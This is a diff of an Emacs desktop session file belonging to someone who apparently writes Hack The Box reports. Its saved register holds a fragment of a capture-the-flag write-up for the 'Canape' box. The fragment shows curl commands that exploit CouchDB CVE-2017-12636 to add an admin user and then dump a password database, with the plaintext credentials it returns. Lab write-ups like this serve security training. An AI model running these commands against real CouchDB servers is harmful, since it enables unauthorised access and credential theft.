@@ -2,30 +2,54 @@
 ;; --------------------------------------------------------------------------
 ;; Desktop File for Emacs
 ;; --------------------------------------------------------------------------
-;; Created Fri Sep 21 09:40:41 2018
+;; Created Sat Sep 22 13:30:20 2018
 ;; Desktop file format version 208
 ;; Emacs version 25.2.2
 
 ;; Global section:
-(setq desktop-saved-frameset [frameset 1 (23460 41081 241335 197000) (desktop . "208") "root@kali" nil nil ((((font-backend xft x) (font . "-PfEd-DejaVu Sans Mono-normal-normal-normal-*-15-*-*-*-m-0-iso10646-1") (font-parameter . "Monospace 11") (border-width . 0) (internal-border-width . 0) (right-divider-width . 0) (bottom-divider-width . 0) (vertical-scroll-bars . right) (horizontal-scroll-bars) (foreground-color . "gray80") (background-color . "#181a26") (mouse-color . "black") (border-color . "black") (screen-gamma) (line-spacing) (left-fringe . 8) (right-fringe . 8) (scroll-bar-foreground) (scroll-bar-background) (menu-bar-lines . 1) (tool-bar-lines . 1) (title) (wait-for-wm . t) (tool-bar-position . top) (icon-type . t) (auto-raise) (auto-lower) (cursor-type . box) (scroll-bar-width . 16) (scroll-bar-height . 0) (alpha) (fullscreen) (display-type . color) (background-mode . dark) (cursor-color . "green") (sticky) (environment) (frameset--id . "ECA6-B0F4-B3C1-1127") (frameset--mini t . t) (modeline . t) (minibuffer . t) (unsplittable) (icon-name) (visibility . t) (display . ":1") (explicit-name) (height . 38) (width . 134) (left . 655) (top . 542)) ((min-height . 4) (min-width . 39) (min-height-ignore . 3) (min-width-ignore . 12) (min-height-safe . 1) (min-width-safe . 4) (min-pixel-height . 72) (min-pixel-width . 351) (min-pixel-height-ignore . 54) (min-pixel-width-ignore . 108) (min-pixel-height-safe . 18) (min-pixel-width-safe . 36)) hc (pixel-width . 1238) (pixel-height . 666) (total-width . 138) (total-height . 37) (normal-height . 1.0) (normal-width . 1.0) (combination-limit) (leaf (pixel-width . 261) (pixel-height . 666) (total-width . 29) (total-height . 37) (normal-height . 1.0) (normal-width . 0.2092084006462035) (buffer " *NeoTree*" (selected . t) (hscroll . 0) (fringes 8 8 nil) (margins nil) (scroll-bars nil 2 t nil 0 t) (vscroll . 0) (dedicated . t) (point . 308) (start . 80))) (leaf (last . t) (pixel-width . 977) (pixel-height . 666) (total-width . 109) (total-height . 37) (normal-height . 1.0) (normal-width . 0.7907915993537965) (buffer "init.el" (selected) (hscroll . 0) (fringes 8 8 nil) (margins nil) (scroll-bars nil 2 t nil 0 t) (vscroll . 0) (dedicated) (point . 3321) (start . 2948)))))])
+(setq desktop-saved-frameset [frameset 1 (23462 10188 755081 381000) (desktop . "208") "root@kali" nil nil ((((font-backend xft x) (font . "-PfEd-DejaVu Sans Mono-normal-normal-normal-*-15-*-*-*-m-0-iso10646-1") (font-parameter . "Monospace 11") (border-width . 0) (internal-border-width . 0) (right-divider-width . 0) (bottom-divider-width . 0) (vertical-scroll-bars . right) (horizontal-scroll-bars) (foreground-color . "#333333") (background-color . "#FFFFFF") (mouse-color . "black") (border-color . "black") (screen-gamma) (line-spacing) (left-fringe . 8) (right-fringe . 8) (scroll-bar-foreground) (scroll-bar-background) (menu-bar-lines . 1) (tool-bar-lines . 1) (title) (wait-for-wm . t) (tool-bar-position . top) (icon-type . t) (auto-raise) (auto-lower) (cursor-type . box) (scroll-bar-width . 16) (scroll-bar-height . 0) (alpha) (fullscreen) (display-type . color) (background-mode . light) (cursor-color . "#0FB300") (sticky) (environment) (frameset--id . "ECA6-B0F4-B3C1-1127") (frameset--mini t . t) (modeline . t) (minibuffer . t) (unsplittable) (icon-name) (display . ":1") (explicit-name) (visibility . t) (height . 44) (width . 136) (left . 108) (top . 203)) ((min-height . 4) (min-width . 20) (min-height-ignore . 3) (min-width-ignore . 12) (min-height-safe . 1) (min-width-safe . 4) (min-pixel-height . 72) (min-pixel-width . 180) (min-pixel-height-ignore . 54) (min-pixel-width-ignore . 108) (min-pixel-height-safe . 18) (min-pixel-width-safe . 36)) hc (pixel-width . 1256) (pixel-height . 788) (total-width . 140) (total-height . 44) (normal-height . 1.0) (normal-width . 1.0) (combination-limit) (leaf (pixel-width . 626) (pixel-height . 788) (total-width . 70) (total-height . 44) (normal-height . 1.0) (normal-width . 0.5) (buffer "canape.org" (selected) (hscroll . 0) (fringes 8 8 nil) (margins nil) (scroll-bars nil 2 t nil 0 t) (vscroll . 0) (dedicated) (point . 12108) (start . 1))) (leaf (last . t) (pixel-width . 630) (pixel-height . 788) (total-width . 70) (total-height . 44) (normal-height . 1.0) (normal-width . 0.5) (buffer "canape.org" (selected . t) (hscroll . 0) (fringes 8 8 nil) (margins nil) (scroll-bars nil 2 t nil 0 t) (vscroll . 0) (dedicated) (point . 12108) (start . 1)))))])
 (setq desktop-missing-file-warning nil)
 (setq tags-file-name nil)
 (setq tags-table-list nil)
-(setq search-ring '("fix"))
-(setq regexp-search-ring nil)
-(setq register-alist '((48 . "#+SETUPFILE: /.emacs.d/org-mode/setupFile_htb.org\n")))
-(setq file-name-history '("~/Downloads/skeleton.org" "~/.emacs.d/init.el" "~/Downloads/test.org" "~/1.org" "~/.emacs.d/init.el" "~/1.org" "~/.emacs.d/init.el" "~/Documents" "~/.emacs.d/init.el" "~/1.org"))
+(setq search-ring '("CE" "fix"))
+(setq regexp-search-ring '("\\<Wfuzz\\>" "\\<-\\>" "\\<py\\>" "\\<user\\>" "\\<root\\>"))
+(setq register-alist '((48 . "\n** Escalating to user\n\nCouchDB 2.0 is vulnerable to RCE (CVE-2017-12636).\nIssue the following to add a new admin user to CouchDB:\n\n#+BEGIN_SRC sh\n\nwww-data@canape:/$ curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:elliot' --data-binary '{\n  \"type\": \"user\",\n  \"name\": \"elliot\",\n  \"roles\": [\"_admin\"],\n  \"roles\": [],\n  \"password\": \"123456\"\n}'\n\n#+END_SRC\n\nFrom here we can print password table entries.\nFirst get a list of password ID's from the database:\n\n#+BEGIN_SRC sh\n\nwww-data@canape:/$ curl --user 'elliot:123456' 127.0.0.1:5984/passwords/_all_doc \n{\"total_rows\":4,\"offset\":0,\"rows\":[\n{\"id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"key\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"value\":{\"rev\":\"2-81cf17b971d9229c54be92eeee723296\"}},\n{\"id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"key\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"value\":{\"rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\"}},\n{\"id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"key\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"value\":{\"rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\"}},\n{\"id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"key\":\"739c5ebdf3f7a001bebb8fc438004738\",\"value\":{\"rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\"}}\n]}\n\n#+END_SRC\n\nPrint each entry:\n\n#+BEGIN_SRC sh\n\nwww-data@canape:/$ \n<0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4                         \n{\"_id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"_rev\":\"2-81cf17b971d9229c54be92eeee723296\",\"item\":\"ssh\",\"password\":\"0B4jyA0xtytZi7esBNGp\",\"user\":\"\"}\n<0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d                         \n{\"_id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"_rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\",\"item\":\"couchdb\",\"password\":\"r3lax0Nth3C0UCH\",\"user\":\"couchy\"}\n<0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f                         \n{\"_id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"_rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\",\"item\":\"simpsonsfanclub.com\",\"password\":\"h02ddjdj2k2k2\",\"user\":\"homer\"}\n<0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738                         \n{\"_id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"_rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\",\"user\":\"homerj0121\",\"item\":\"github\",\"password\":\"STOP STORING YOUR PASSWORDS HERE -Admin\"}\nwww-data@canape:/$ \n\n#+END_SRC\n\n")))
+(setq file-name-history '("~/shared/reports/htb/boxes/canape/canape.org" "~/shared/reports/htb/config/boxes/canape/canape.org" "~/.emacs.d/org-mode/org-html-themes/README.org" "~/shared/reports/htb/" "~/Downloads/skeleton.org" "~/.emacs.d/init.el" "~/Downloads/test.org" "~/1.org" "~/.emacs.d/init.el" "~/1.org" "~/.emacs.d/init.el" "~/Documents" "~/.emacs.d/init.el" "~/1.org"))
 
 ;; Buffer section -- buffers listed in same order as in buffer list:
+(desktop-create-buffer 208
+  "/root/shared/reports/htb/boxes/canape/canape.org"
+  "canape.org"
+  'org-mode
+  '(undo-tree-mode)
+  12108
+  '(12108 nil)
+  nil
+  nil
+  '((buffer-file-coding-system . undecided-unix) (overwrite-mode) (truncate-lines . t))
+  '((mark-ring (12108 12108 12108 12108 12108 12108 12108 5911 12108 12108 12108 5912 12108 12108 12108 12108))))
+
 (desktop-create-buffer 208
   "/root/.emacs.d/init.el"
   "init.el"
   'emacs-lisp-mode
   '(undo-tree-mode)
-  3321
-  '(3321 nil)
+  277
+  '(277 nil)
   nil
   nil
   '((buffer-file-coding-system . utf-8-unix) (overwrite-mode))
-  '((mark-ring (3234 3235 3534 3534 3534 3534 3534 3534 3534 3534 3534 3534 3534 3534 3534 3534))))
+  '((mark-ring (277 1374 3342 3342 3255 3256 3555 3555 3555 3555 3555 3555 3555 3555 3555 3555))))
+
+(desktop-create-buffer 208
+  "/usr/share/emacs/25.2/etc/COPYING"
+  "COPYING"
+  'fundamental-mode
+  '(undo-tree-mode view-mode goto-address-mode)
+  1
+  '(1 nil)
+  t
+  nil
+  '((buffer-file-coding-system . undecided-unix) (overwrite-mode))
+  '((mark-ring nil)))
 
